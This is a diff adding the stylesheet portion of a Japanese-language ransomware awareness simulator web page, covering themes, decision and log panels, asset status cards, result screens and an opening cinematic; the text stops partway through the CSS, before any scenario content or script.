@@ -1,0 +1,2322 @@
+<!DOCTYPE html>
+<html lang="ja" data-theme="light">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ランサムウェア体験シミュレーター — マモール株式会社</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@400;600&family=Noto+Sans+JP:wght@400;500;700&family=Oswald:wght@500;700&display=swap');
+
+:root {
+  --bg:       #07090f;
+  --surface:  #0e1320;
+  --surface2: #131928;
+  --border:   #1e2d42;
+  --border2:  #253550;
+  --cyan:     #38bdf8;
+  --red:      #f43f5e;
+  --orange:   #fb923c;
+  --green:    #34d399;
+  --yellow:   #fbbf24;
+  --purple:   #a78bfa;
+  --dim:      #3a4e68;
+  --muted:    #6b8099;
+  --text:     #a8bdd0;
+  --text-hi:  #e8f0f8;
+  --mono:     'IBM Plex Mono', monospace;
+  --sans:     'Noto Sans JP', sans-serif;
+  --head:     'Oswald', sans-serif;
+}
+/* ══ LIGHT THEME ══ */
+[data-theme="light"] {
+  --bg:       #f0f4f8;
+  --surface:  #ffffff;
+  --surface2: #e8eef5;
+  --border:   #c8d8e8;
+  --border2:  #b0c4d8;
+  --cyan:     #0284c7;
+  --red:      #e11d48;
+  --orange:   #ea580c;
+  --green:    #059669;
+  --yellow:   #d97706;
+  --purple:   #7c3aed;
+  --dim:      #94a3b8;
+  --muted:    #64748b;
+  --text:     #334155;
+  --text-hi:  #0f172a;
+}
+[data-theme="light"] body {
+  background: var(--bg);
+  color: var(--text);
+}
+/* ログパネル背景 */
+[data-theme="light"] #log-panel {
+  background: #f8fafc;
+}
+/* ログエントリ区切り線 */
+[data-theme="light"] .log-entry {
+  border-bottom-color: #dde8f0;
+}
+/* ログコードブロック */
+[data-theme="light"] .log-code {
+  background: #e8f0f8;
+  border-color: var(--border);
+  color: #1e3a5f;
+}
+/* バッジ */
+[data-theme="light"] .b-normal { background: rgba(2,132,199,0.1);   color: #0369a1; border-color: rgba(2,132,199,0.3); }
+[data-theme="light"] .b-warn   { background: rgba(234,88,12,0.1);   color: #c2410c; border-color: rgba(234,88,12,0.3); }
+[data-theme="light"] .b-crit   { background: rgba(225,29,72,0.1);   color: #be123c; border-color: rgba(225,29,72,0.3); }
+[data-theme="light"] .b-ok     { background: rgba(5,150,105,0.1);   color: #047857; border-color: rgba(5,150,105,0.3); }
+[data-theme="light"] .b-action { background: rgba(124,58,237,0.1);  color: #6d28d9; border-color: rgba(124,58,237,0.3); }
+/* ログ本文色 */
+[data-theme="light"] .log-body.crit  { color: #9f1239; }
+[data-theme="light"] .log-body.warn  { color: #9a3412; }
+[data-theme="light"] .log-body.ok    { color: #065f46; }
+[data-theme="light"] .log-body.action{ color: #5b21b6; }
+/* ハイライトカラー */
+[data-theme="light"] .hr { color: #be123c; }
+[data-theme="light"] .ho { color: #c2410c; }
+[data-theme="light"] .hg { color: #047857; }
+[data-theme="light"] .hd { color: var(--muted); }
+/* 技術パネル */
+[data-theme="light"] .tech-tip {
+  background: rgba(5,150,105,0.06);
+  border-color: rgba(5,150,105,0.25);
+}
+[data-theme="light"] .tech-tip p { color: #065f46; }
+[data-theme="light"] .tech-tip p b { color: #047857; }
+[data-theme="light"] .impact-list li { color: #9f1239; }
+/* 選択ボタン */
+[data-theme="light"] .choice-btn {
+  background: rgba(0,0,0,0.025);
+  border-color: var(--border);
+}
+[data-theme="light"] .choice-btn:hover {
+  background: rgba(2,132,199,0.06);
+  border-color: rgba(2,132,199,0.5);
+}
+[data-theme="light"] .choice-btn .cd { color: var(--text); }
+[data-theme="light"] #d-prompt {
+  background: rgba(234,88,12,0.06);
+  border-color: rgba(234,88,12,0.3);
+  border-left-color: var(--orange);
+  color: var(--text-hi);
+}
+/* アセットノード */
+[data-theme="light"] .asset-node         { background: #f0f6ff; border-color: var(--border); }
+[data-theme="light"] .asset-node.warn    { background: #fff4ed; }
+[data-theme="light"] .asset-node.compromised { background: #fff0f3; }
+[data-theme="light"] .asset-node.destroyed   { background: #ffe4e6; }
+[data-theme="light"] .asset-node.safe        { background: #ecfdf5; }
+/* フェーズバー */
+[data-theme="light"] .ph.done .ph-dot  { color: #fff; }
+/* スタート画面 */
+[data-theme="light"] #start-screen { background: var(--bg); }
+[data-theme="light"] .start-card   { background: var(--surface); border-color: var(--border2); }
+[data-theme="light"] .warn-strip   { background: rgba(234,88,12,0.06); border-color: rgba(234,88,12,0.4); }
+/* 結果画面 */
+[data-theme="light"] #end-screen   { background: rgba(240,244,248,0.97); }
+[data-theme="light"] .result-card,
+[data-theme="light"] .success-card { background: var(--surface); }
+[data-theme="light"] .ransom-note  { background: #fff0f3; }
+/* スコアバッジ */
+[data-theme="light"] .score-badge  { background: var(--surface2); }
+[data-theme="light"] .gs-dot       { background: var(--border); border-color: var(--border2); }
+/* フォレンジックコンソールのログ */
+[data-theme="light"] .log-divider .dl { background: var(--border); }
+[data-theme="light"] .log-divider .dt { border-color: var(--border2); color: var(--muted); }
+[data-theme="light"] .log-divider.phase .dt  { color: var(--cyan);  border-color: rgba(2,132,199,0.4);  background: rgba(2,132,199,0.05); }
+[data-theme="light"] .log-divider.danger .dt { color: var(--red);   border-color: rgba(225,29,72,0.4);  background: rgba(225,29,72,0.05); }
+[data-theme="light"] .log-divider.ok .dt     { color: var(--green); border-color: rgba(5,150,105,0.4);  background: rgba(5,150,105,0.05); }
+
+/* ── Theme Toggle Switch ── */
+#theme-toggle {
+  display: flex;
+  align-items: center;
+  gap: 8px;
+  margin-left: 18px;
+  flex-shrink: 0;
+}
+.toggle-label {
+  font-family: var(--mono);
+  font-size: 10px;
+  letter-spacing: 0.08em;
+  color: var(--muted);
+  white-space: nowrap;
+  user-select: none;
+}
+.toggle-track {
+  width: 40px;
+  height: 22px;
+  background: var(--border2);
+  border-radius: 11px;
+  position: relative;
+  cursor: pointer;
+  transition: background 0.3s;
+  border: 1px solid var(--border);
+  flex-shrink: 0;
+}
+.toggle-track.on {
+  background: rgba(56,189,248,0.25);
+  border-color: var(--cyan);
+}
+[data-theme="light"] .toggle-track.on {
+  background: rgba(2,132,199,0.2);
+  border-color: var(--cyan);
+}
+.toggle-thumb {
+  position: absolute;
+  top: 2px; left: 2px;
+  width: 16px; height: 16px;
+  border-radius: 50%;
+  background: var(--muted);
+  transition: transform 0.25s ease, background 0.25s;
+}
+.toggle-track.on .toggle-thumb {
+  transform: translateX(18px);
+  background: var(--cyan);
+}
+.toggle-icon {
+  font-size: 13px;
+  line-height: 1;
+}
+
+
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html, body { height: 100%; overflow: hidden; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: var(--sans);
+  font-size: 16px;
+  display: flex;
+  flex-direction: column;
+}
+
+/* ══════════════════════════════
+   TOPBAR
+══════════════════════════════ */
+#topbar {
+  background: var(--surface);
+  border-bottom: 2px solid var(--border2);
+  padding: 0 20px;
+  height: 54px;
+  display: flex;
+  align-items: center;
+  gap: 16px;
+  flex-shrink: 0;
+}
+#topbar h1 {
+  font-family: var(--head);
+  font-size: 20px;
+  font-weight: 700;
+  letter-spacing: 0.12em;
+  color: var(--text-hi);
+  white-space: nowrap;
+}
+.tag {
+  font-family: var(--mono);
+  font-size: 10px;
+  color: var(--orange);
+  border: 1px solid rgba(251,146,60,0.5);
+  padding: 3px 10px;
+  letter-spacing: 0.08em;
+  background: rgba(251,146,60,0.06);
+}
+.kpi-strip { display: flex; gap: 24px; margin-left: auto; align-items: center; }
+.kpi-item  { display: flex; align-items: center; gap: 10px; }
+.kpi-name  { font-size: 13px; letter-spacing: 0.04em; color: var(--muted); white-space: nowrap; }
+.kpi-val   { font-family: var(--mono); font-size: 17px; font-weight: 600; min-width: 48px; text-align: right; transition: color 0.5s; }
+.kpi-bar-wrap { width: 70px; height: 6px; background: var(--border); border-radius: 3px; overflow: hidden; }
+.kpi-bar   { height: 100%; border-radius: 3px; transition: width 0.7s ease, background 0.5s; }
+
+/* ══════════════════════════════
+   PHASE BAR
+══════════════════════════════ */
+#phase-row {
+  background: var(--surface2);
+  border-bottom: 1px solid var(--border2);
+  padding: 10px 20px;
+  display: flex;
+  align-items: center;
+  flex-shrink: 0;
+  overflow-x: auto;
+}
+.ph { display: flex; align-items: center; flex-shrink: 0; }
+.ph-dot {
+  width: 32px; height: 32px; border-radius: 50%;
+  border: 2px solid var(--dim);
+  display: flex; align-items: center; justify-content: center;
+  font-family: var(--mono); font-size: 12px; color: var(--dim);
+  transition: all 0.4s; flex-shrink: 0;
+}
+.ph-info { margin: 0 8px; }
+.ph-num  { font-family: var(--mono); font-size: 11px; color: var(--dim); letter-spacing: 0.06em; }
+.ph-name { font-size: 13px; font-weight: 700; color: var(--dim); white-space: nowrap; transition: color 0.4s; }
+.ph-line { min-width: 18px; max-width: 56px; flex: 1; height: 2px; background: var(--dim); margin: 0 2px; transition: background 0.4s; }
+
+.ph.active .ph-dot  { border-color: var(--cyan); color: var(--cyan); box-shadow: 0 0 10px rgba(56,189,248,0.45); }
+.ph.active .ph-name { color: var(--cyan); }
+.ph.done   .ph-dot  { background: var(--green); border-color: var(--green); color: #000; }
+.ph.done   .ph-name { color: var(--green); }
+.ph.done   .ph-line { background: var(--green); }
+.ph.danger .ph-dot  { background: var(--red); border-color: var(--red); color: #fff; animation: pulse-r 1.2s infinite; }
+.ph.danger .ph-name { color: var(--red); }
+.ph.stopped .ph-dot { background: var(--yellow); border-color: var(--yellow); color: #000; }
+.ph.stopped .ph-name{ color: var(--yellow); }
+
+@keyframes pulse-r  { 0%,100%{box-shadow:0 0 0 0 rgba(244,63,94,0.4)} 50%{box-shadow:0 0 0 7px rgba(244,63,94,0)} }
+@keyframes appear   { from{opacity:0;transform:translateY(5px)} to{opacity:1;transform:none} }
+@keyframes blink-t  { 0%,100%{border-top-color:var(--red)} 50%{border-top-color:#600020} }
+
+/* ══════════════════════════════
+   3-COLUMN WORKSPACE
+══════════════════════════════ */
+#workspace {
+  flex: 1;
+  display: grid;
+  grid-template-columns: 272px 1fr 340px;
+  grid-template-rows: 1fr 190px;
+  min-height: 0;
+}
+
+/* ── COL 1: Decision ── */
+#decision-panel {
+  grid-column: 1;
+  grid-row: 1 / 3;
+  display: flex;
+  flex-direction: column;
+  border-right: 1px solid var(--border2);
+  background: var(--surface);
+  overflow-y: auto;
+  scrollbar-width: thin;
+  scrollbar-color: var(--border2) transparent;
+  padding: 16px 14px;
+}
+.dec-head {
+  font-family: var(--head);
+  font-size: 15px;
+  font-weight: 700;
+  letter-spacing: 0.12em;
+  color: var(--text-hi);
+  text-transform: uppercase;
+  border-bottom: 3px solid var(--orange);
+  padding-bottom: 10px;
+  margin-bottom: 14px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.dec-head::before {
+  content: '▶';
+  font-size: 14px;
+  color: var(--orange);
+}
+#d-prompt {
+  background: rgba(251,146,60,0.08);
+  border: 1px solid rgba(251,146,60,0.3);
+  border-left: 4px solid var(--orange);
+  padding: 12px 14px;
+  font-size: 14px;
+  line-height: 1.75;
+  color: var(--text-hi);
+  margin-bottom: 16px;
+  display: none;
+  border-radius: 2px;
+  font-weight: 500;
+}
+.choice-btn {
+  width: 100%;
+  background: rgba(255,255,255,0.025);
+  border: 1px solid var(--border2);
+  padding: 13px 15px;
+  margin-bottom: 10px;
+  cursor: pointer;
+  text-align: left;
+  display: block;
+  transition: background 0.15s, border-color 0.15s, transform 0.12s;
+  border-radius: 4px;
+}
+.choice-btn:hover {
+  background: rgba(56,189,248,0.07);
+  border-color: rgba(56,189,248,0.5);
+  transform: translateX(3px);
+}
+.choice-btn .cl {
+  display: block;
+  font-family: var(--mono);
+  font-size: 13px;
+  font-weight: 600;
+  margin-bottom: 6px;
+  color: var(--cyan);
+  letter-spacing: 0.04em;
+}
+.choice-btn.nothing       { border-style: dashed; border-color: var(--dim); }
+.choice-btn.nothing .cl   { color: var(--muted); }
+.choice-btn.nothing:hover { background: rgba(251,146,60,0.06); border-color: var(--orange); }
+.choice-btn .cd {
+  display: block;
+  font-size: 14px;
+  line-height: 1.65;
+  color: var(--text);
+}
+.choice-btn .cr {
+  display: inline-block;
+  margin-top: 8px;
+  font-family: var(--mono);
+  font-size: 11px;
+  padding: 3px 10px;
+  border-radius: 2px;
+  letter-spacing: 0.04em;
+}
+.rl { background: rgba(52,211,153,0.12); color: var(--green); border: 1px solid rgba(52,211,153,0.3); }
+.rm { background: rgba(251,146,60,0.12); color: var(--orange); border: 1px solid rgba(251,146,60,0.3); }
+.rh { background: rgba(244,63,94,0.12);  color: var(--red);    border: 1px solid rgba(244,63,94,0.3); }
+.rn { background: rgba(107,128,153,0.12);color: var(--muted);  border: 1px solid rgba(107,128,153,0.25); }
+.idle-msg {
+  text-align: center;
+  padding: 36px 12px;
+  color: var(--dim);
+  font-family: var(--mono);
+  font-size: 13px;
+  letter-spacing: 0.08em;
+  line-height: 1.8;
+}
+
+/* ── COL 2: Log + Assets ── */
+#left-col {
+  grid-column: 2;
+  grid-row: 1 / 3;
+  display: grid;
+  grid-template-rows: 1fr 190px;
+  border-right: 1px solid var(--border2);
+  min-height: 0;
+}
+
+#log-panel {
+  background: var(--bg);
+  overflow-y: auto;
+  padding: 14px 18px;
+  min-height: 0;
+  scrollbar-width: thin;
+  scrollbar-color: var(--border2) transparent;
+}
+.log-divider {
+  display: flex; align-items: center; gap: 10px;
+  margin: 16px 0 12px;
+}
+.log-divider .dl { flex: 1; height: 1px; background: var(--border); }
+.log-divider .dt {
+  font-family: var(--mono); font-size: 12px; letter-spacing: 0.1em;
+  padding: 4px 12px; border: 1px solid var(--border); color: var(--muted);
+  white-space: nowrap;
+}
+.log-divider.phase  .dt { color: var(--cyan);   border-color: rgba(56,189,248,0.4); background: rgba(56,189,248,0.05); }
+.log-divider.danger .dt { color: var(--red);    border-color: rgba(244,63,94,0.4);  background: rgba(244,63,94,0.05); }
+.log-divider.ok     .dt { color: var(--green);  border-color: rgba(52,211,153,0.4); background: rgba(52,211,153,0.05); }
+
+.log-entry {
+  display: grid;
+  grid-template-columns: 130px 1fr;
+  gap: 12px;
+  margin-bottom: 12px;
+  padding-bottom: 12px;
+  border-bottom: 1px solid rgba(30,45,66,0.7);
+  animation: appear 0.2s ease;
+  align-items: start;
+}
+.log-left { display: flex; flex-direction: column; gap: 4px; padding-top: 1px; }
+.log-time   { font-family: var(--mono); font-size: 12px; color: var(--dim); }
+.log-source { font-family: var(--mono); font-size: 11px; color: var(--muted); line-height: 1.4; word-break: break-all; }
+.log-badge  {
+  display: inline-block; font-family: var(--mono); font-size: 11px;
+  letter-spacing: 0.07em; padding: 2px 7px; border-radius: 2px;
+  margin-top: 2px; width: fit-content;
+}
+.b-normal { background: rgba(56,189,248,0.1);  color: var(--cyan);   border: 1px solid rgba(56,189,248,0.25); }
+.b-warn   { background: rgba(251,146,60,0.1);  color: var(--orange); border: 1px solid rgba(251,146,60,0.25); }
+.b-crit   { background: rgba(244,63,94,0.12);  color: var(--red);    border: 1px solid rgba(244,63,94,0.3); }
+.b-ok     { background: rgba(52,211,153,0.1);  color: var(--green);  border: 1px solid rgba(52,211,153,0.25); }
+.b-action { background: rgba(167,139,250,0.1); color: var(--purple); border: 1px solid rgba(167,139,250,0.25); }
+
+.log-body       { font-size: 15px; line-height: 1.75; color: var(--text); }
+.log-body.crit  { color: #fca5a5; }
+.log-body.warn  { color: #fdba74; }
+.log-body.ok    { color: #6ee7b7; }
+.log-body.action{ color: #c4b5fd; }
+
+.log-code {
+  display: block; margin-top: 7px;
+  background: #040609; border: 1px solid var(--border);
+  padding: 10px 14px; font-family: var(--mono); font-size: 12px;
+  color: #cdd8e8; border-radius: 3px; line-height: 1.85;
+  white-space: pre-wrap; word-break: break-all;
+}
+.hr { color: #ff7096; }
+.ho { color: #fdba74; }
+.hg { color: #6ee7b7; }
+.hd { color: var(--muted); }
+
+/* Asset Panel */
+#asset-panel {
+  background: var(--surface);
+  border-top: 1px solid var(--border2);
+  padding: 14px 18px;
+  overflow: hidden;
+}
+.asset-title {
+  font-family: var(--head); font-size: 14px; font-weight: 700; letter-spacing: 0.1em;
+  color: var(--text-hi); margin-bottom: 12px; text-transform: uppercase;
+}
+.asset-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 10px; }
+.asset-node {
+  background: var(--surface2); border: 1px solid var(--border);
+  border-top: 3px solid var(--green); padding: 9px 10px; transition: all 0.4s;
+  border-radius: 2px;
+}
+.asset-node.warn        { border-top-color: var(--orange); background: rgba(30,15,0,0.6); }
+.asset-node.compromised { border-top-color: var(--red); background: rgba(30,5,12,0.7); animation: blink-t 2s infinite; }
+.asset-node.offline     { border-top-color: var(--dim); opacity: 0.4; }
+.asset-node.destroyed   { border-top-color: var(--red); background: rgba(40,0,15,0.8); }
+.asset-node.safe        { border-top-color: var(--green); background: rgba(0,20,10,0.5); }
+.a-icon { font-size: 24px; margin-bottom: 6px; }
+.a-name { font-size: 13px; font-weight: 700; color: var(--text-hi); margin-bottom: 4px; }
+.a-stat { font-family: var(--mono); font-size: 11px; color: var(--muted); transition: color 0.4s; line-height: 1.4; }
+.asset-node.warn        .a-stat { color: var(--orange); }
+.asset-node.compromised .a-stat { color: var(--red); }
+.asset-node.destroyed   .a-stat { color: var(--red); }
+.asset-node.safe        .a-stat { color: var(--green); }
+
+/* ── COL 3: Tech Panel ── */
+#tech-panel {
+  grid-column: 3;
+  grid-row: 1 / 3;
+  background: var(--surface2);
+  border-left: 1px solid var(--border2);
+  padding: 16px 18px;
+  overflow-y: auto;
+  scrollbar-width: thin;
+  scrollbar-color: var(--border2) transparent;
+}
+.panel-head {
+  font-family: var(--head);
+  font-size: 15px;
+  font-weight: 700;
+  letter-spacing: 0.1em;
+  color: var(--text-hi);
+  border-bottom: 3px solid var(--cyan);
+  padding-bottom: 10px;
+  margin-bottom: 16px;
+  text-transform: uppercase;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.panel-head::before {
+  content: '🔍';
+  font-size: 16px;
+  font-style: normal;
+}
+.tech-ph-title {
+  font-family: var(--head); font-size: 22px; font-weight: 700;
+  color: var(--text-hi); margin-bottom: 6px; letter-spacing: 0.03em;
+}
+.tech-attck {
+  font-family: var(--mono); font-size: 12px; color: var(--orange);
+  margin-bottom: 16px; letter-spacing: 0.05em;
+  padding: 4px 10px; background: rgba(251,146,60,0.08);
+  border: 1px solid rgba(251,146,60,0.25); display: inline-block; border-radius: 2px;
+}
+.tech-desc { font-size: 15px; line-height: 1.9; color: var(--text); margin-bottom: 18px; }
+.tech-desc b { color: var(--text-hi); }
+.impact-head {
+  font-size: 13px; font-weight: 700; color: var(--red);
+  letter-spacing: 0.08em; margin-bottom: 10px; text-transform: uppercase;
+  display: flex; align-items: center; gap: 6px;
+}
+.impact-head::before { content: ''; display: block; width: 3px; height: 12px; background: var(--red); border-radius: 2px; }
+.impact-list { list-style: none; margin-bottom: 16px; }
+.impact-list li {
+  font-size: 14px; line-height: 1.8; color: #fca5a5;
+  padding: 5px 0 5px 20px; position: relative;
+  border-bottom: 1px solid rgba(244,63,94,0.08);
+}
+.impact-list li::before { content: '›'; position: absolute; left: 5px; color: var(--red); font-size: 14px; }
+.tech-tip {
+  background: rgba(52,211,153,0.06);
+  border: 1px solid rgba(52,211,153,0.2);
+  border-left: 3px solid var(--green);
+  padding: 12px 14px; border-radius: 2px;
+}
+.tech-tip-head { font-size: 12px; font-weight: 700; color: var(--green); letter-spacing: 0.08em; text-transform: uppercase; margin-bottom: 8px; }
+.tech-tip p { font-size: 14px; line-height: 1.8; color: #86efac; }
+.tech-tip p b { color: #a7f3d0; }
+.tech-idle {
+  display: flex; flex-direction: column; align-items: center; justify-content: center;
+  min-height: 300px; gap: 14px; color: var(--dim); text-align: center;
+}
+.tech-idle .ti-icon { font-size: 48px; opacity: 0.3; }
+.tech-idle p { font-size: 15px; line-height: 1.75; max-width: 240px; }
+
+/* ══════════════════════════════
+   START SCREEN
+══════════════════════════════ */
+#start-screen {
+  position: fixed; inset: 0; background: var(--bg);
+  display: flex; align-items: center; justify-content: center; z-index: 900;
+  overflow-y: auto; padding: 20px;
+}
+.start-inner { max-width: 660px; width: 100%; }
+.start-inner h1 {
+  font-family: var(--head); font-size: clamp(24px, 4vw, 34px); font-weight: 700;
+  color: var(--text-hi); letter-spacing: 0.06em; margin-bottom: 8px;
+}
+.start-sub { font-family: var(--mono); font-size: 11px; letter-spacing: 0.18em; color: var(--cyan); margin-bottom: 28px; }
+.start-card {
+  background: var(--surface); border: 1px solid var(--border2);
+  border-top: 3px solid var(--cyan); padding: 28px 32px; margin-bottom: 18px;
+}
+.start-card h2 {
+  font-family: var(--head); font-size: 13px; letter-spacing: 0.15em;
+  color: var(--cyan); margin-bottom: 14px; text-transform: uppercase;
+}
+.start-card p { font-size: 14px; line-height: 1.9; color: var(--text); margin-bottom: 14px; }
+.start-card p:last-child { margin-bottom: 0; }
+.start-card strong { color: var(--text-hi); font-weight: 700; }
+.sc-steps { display: grid; grid-template-columns: repeat(6,1fr); gap: 8px; margin: 20px 0; }
+.sc-s {
+  background: var(--surface2); border: 1px solid var(--border);
+  padding: 10px 6px; text-align: center; font-size: 11px; line-height: 1.6; color: var(--muted);
+  border-radius: 2px;
+}
+.sc-s .sn { display: block; font-family: var(--mono); font-size: 9px; color: var(--dim); margin-bottom: 4px; }
+.warn-strip {
+  background: rgba(251,146,60,0.07); border: 1px solid rgba(251,146,60,0.3);
+  padding: 12px 16px; font-size: 13px; color: var(--orange); margin-bottom: 22px; border-radius: 2px;
+}
+.btn-start {
+  font-family: var(--head); font-size: 15px; letter-spacing: 0.2em;
+  color: #000; background: var(--cyan); border: none;
+  padding: 15px 48px; cursor: pointer; text-transform: uppercase;
+  display: block; width: 100%; transition: background 0.2s, box-shadow 0.2s; border-radius: 2px;
+}
+.btn-start:hover { background: #7dd3fc; box-shadow: 0 4px 24px rgba(56,189,248,0.35); }
+
+/* ══════════════════════════════
+   GAME OVER / SUCCESS SCREEN
+══════════════════════════════ */
+#end-screen {
+  position: fixed; inset: 0; background: rgba(5,7,12,0.97);
+  display: none; align-items: flex-start; justify-content: center;
+  z-index: 800; overflow-y: auto; padding: 40px 20px;
+}
+.end-popup { max-width: 660px; width: 100%; animation: appear 0.4s ease; }
+
+/* Ransom note — only shown on full compromise */
+.ransom-note {
+  background: #100006; border: 2px solid var(--red);
+  padding: 34px 38px; text-align: center;
+  box-shadow: 0 0 60px rgba(244,63,94,0.22); margin-bottom: 16px; display: none;
+  border-radius: 2px;
+}
+.ransom-note h2 { font-family: var(--mono); font-size: 15px; color: var(--red); letter-spacing: 0.08em; margin-bottom: 16px; }
+.rn-body  { font-size: 13.5px; line-height: 2; color: #fca5a5; margin-bottom: 16px; }
+.rn-id    { font-family: var(--mono); font-size: 11px; letter-spacing: 0.12em; color: var(--muted); background: rgba(244,63,94,0.06); border: 1px solid rgba(244,63,94,0.2); padding: 8px; margin-bottom: 20px; }
+.rn-btns  { display: flex; gap: 14px; justify-content: center; flex-wrap: wrap; }
+.rn-btn   { background: transparent; border: 1px solid currentColor; padding: 13px 26px; font-family: var(--head); font-size: 12px; letter-spacing: 0.12em; cursor: pointer; text-transform: uppercase; transition: all 0.2s; border-radius: 2px; }
+.rn-btn.pay   { color: var(--orange); }
+.rn-btn.nopay { color: var(--green); }
+.rn-btn:hover { filter: brightness(1.3); background: rgba(255,255,255,0.04); }
+
+/* Result card */
+.result-card {
+  max-width: 660px; width: 100%; background: var(--surface);
+  border: 1px solid var(--border2); padding: 32px 36px; display: none;
+  animation: appear 0.4s ease; border-radius: 2px;
+}
+.result-card h2 { font-family: var(--head); font-size: 22px; letter-spacing: 0.06em; margin-bottom: 22px; }
+.r-kpi-row { display: grid; grid-template-columns: repeat(3,1fr); gap: 12px; margin-bottom: 22px; }
+.r-kpi { background: var(--surface2); border: 1px solid var(--border); padding: 16px 12px; text-align: center; border-radius: 3px; }
+.r-kpi-icon { font-size: 22px; margin-bottom: 6px; }
+.r-kpi-name { font-size: 12px; font-weight: 700; color: var(--text-hi); margin-bottom: 3px; }
+.r-kpi-sub  { font-size: 10px; color: var(--muted); margin-bottom: 10px; font-family: var(--mono); letter-spacing: 0.05em; }
+.r-kpi-bar-wrap { width: 100%; height: 6px; background: var(--border); border-radius: 3px; overflow: hidden; margin-bottom: 8px; }
+.r-kpi-bar  { height: 100%; border-radius: 3px; transition: width 0.8s ease; }
+.r-kpi-val  { font-family: var(--mono); font-size: 20px; font-weight: 600; }
+.result-text { font-size: 13.5px; line-height: 1.9; color: var(--text); margin-bottom: 20px; border-top: 1px solid var(--border); padding-top: 18px; }
+.result-text b { color: var(--text-hi); }
+.result-lessons h3 { font-family: var(--head); font-size: 12px; letter-spacing: 0.15em; color: var(--cyan); text-transform: uppercase; margin-bottom: 12px; }
+.result-lessons li { font-size: 13px; line-height: 1.8; color: var(--text); margin-bottom: 8px; padding-left: 18px; position: relative; }
+.result-lessons li::before { content: '✓'; position: absolute; left: 0; color: var(--green); font-weight: 700; }
+.score-badge { text-align: center; margin: 22px 0; padding: 22px 20px; background: var(--surface2); border-radius: 3px; border: 1px solid var(--border); }
+.grade-lbl   { font-family: var(--head); font-size: 56px; font-weight: 700; line-height: 1; }
+.grade-sub   { font-family: var(--mono); font-size: 12px; color: var(--muted); margin-top: 6px; letter-spacing: 0.06em; }
+.grade-steps { display: flex; justify-content: center; gap: 6px; margin-top: 14px; }
+.gs-dot {
+  width: 28px; height: 28px; border-radius: 50%;
+  background: var(--border); border: 2px solid var(--border2);
+  display: flex; align-items: center; justify-content: center;
+  font-family: var(--mono); font-size: 10px; color: var(--dim);
+  transition: all 0.3s;
+}
+.gs-dot.hit  { border-color: var(--green); background: rgba(52,211,153,0.15); color: var(--green); }
+.gs-dot.miss { border-color: var(--border); opacity: 0.45; }
+.grade-explain { font-size: 12px; color: var(--muted); margin-top: 10px; line-height: 1.6; }
+.btn-retry {
+  display: block; width: 100%; margin-top: 20px;
+  font-family: var(--head); font-size: 14px; letter-spacing: 0.2em;
+  color: var(--cyan); background: transparent; border: 1px solid var(--cyan);
+  padding: 13px; cursor: pointer; text-transform: uppercase; transition: all 0.2s; border-radius: 2px;
+}
+.btn-retry:hover { background: var(--cyan); color: #000; }
+
+/* Success card */
+.success-card {
+  max-width: 660px; width: 100%; background: var(--surface);
+  border: 1px solid rgba(52,211,153,0.3); border-top: 3px solid var(--green);
+  padding: 32px 36px; display: none; animation: appear 0.4s ease; border-radius: 2px;
+}
+.success-card h2 { font-family: var(--head); font-size: 22px; color: var(--green); letter-spacing: 0.06em; margin-bottom: 16px; }
+
+/* Flash effect */
+
+/* ── Opening Cinema ── */
+#opening-screen {
+  position: fixed; inset: 0; z-index: 950;
+  background: #000;
+  display: none;
+  align-items: center;
+  justify-content: center;
+  flex-direction: column;
+}
+.cinema-bars {
+  position: absolute; inset: 0;
+  pointer-events: none;
+}
+.cinema-bar-top {
+  position: absolute; top: 0; left: 0; right: 0;
+  height: 80px; background: #000;
+  border-bottom: 1px solid #111;
+}
+.cinema-bar-bottom {
+  position: absolute; bottom: 0; left: 0; right: 0;
+  height: 80px; background: #000;
+  border-top: 1px solid #111;
+}
+.cinema-scene {
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  width: 100%;
+  height: calc(100% - 160px);
+  position: relative;
+}
+.cinema-bg {
+  position: absolute; inset: 0;
+  background:
+    radial-gradient(ellipse 60% 80% at 60% 50%, #0d1829 0%, #030508 70%);
+}
+/* 机・部屋の雰囲気 */
+.cinema-desk {
+  position: absolute;
+  bottom: 0; left: 0; right: 0; height: 38%;
+  background: linear-gradient(to top, #0a0e18 0%, #0d1425 60%, transparent 100%);
+  border-top: 1px solid rgba(255,255,255,0.04);
+}
+.cinema-monitor {
+  position: relative;
+  width: 340px;
+  z-index: 2;
+}
+.monitor-body {
+  background: #0a0c14;
+  border: 2px solid #1a2235;
+  border-radius: 6px;
+  padding: 12px;
+  box-shadow:
+    0 0 60px rgba(56,189,248,0.08),
+    0 20px 60px rgba(0,0,0,0.8),
+    inset 0 0 20px rgba(0,0,0,0.5);
+}
+.monitor-screen {
+  background: #060c18;
+  border: 1px solid #0d1a2e;
+  border-radius: 3px;
+  padding: 16px 14px;
+  min-height: 200px;
+  font-family: 'IBM Plex Mono', monospace;
+  font-size: 11px;
+  line-height: 1.7;
+  color: #4a6a88;
+  position: relative;
+  overflow: hidden;
+}
+.monitor-screen::before {
+  content: '';
+  position: absolute; inset: 0;
+  background: repeating-linear-gradient(
+    0deg,
+    transparent,
+    transparent 2px,
+    rgba(0,0,0,0.08) 2px,
+    rgba(0,0,0,0.08) 4px
+  );
+  pointer-events: none;
+}
+.monitor-email-line {
+  color: #4a6a88;
+  margin-bottom: 6px;
+  opacity: 0;
+  transition: opacity 0.4s;
+}
+.monitor-email-line.show { opacity: 1; }
+.monitor-email-line.highlight { color: #e2e8f0; }
+.monitor-email-line.subject  { color: #fbbf24; }
+.monitor-email-line.attach   { color: #fb923c; }
+.monitor-email-line.cursor::after {
+  content: '█';
+  animation: blink-cur 0.8s step-end infinite;
+  color: var(--cyan);
+}
+@keyframes blink-cur { 0%,100%{opacity:1} 50%{opacity:0} }
+.monitor-stand {
+  width: 40px; height: 20px;
+  background: linear-gradient(to bottom, #0e1425, #0a0c14);
+  margin: 0 auto;
+  border: 1px solid #1a2235;
+  border-top: none;
+  border-radius: 0 0 4px 4px;
+}
+.monitor-base {
+  width: 120px; height: 8px;
+  background: #0a0c14;
+  margin: 0 auto;
+  border: 1px solid #1a2235;
+  border-radius: 4px;
+}
+/* キャラクター */
+.cinema-char {
+  position: absolute;
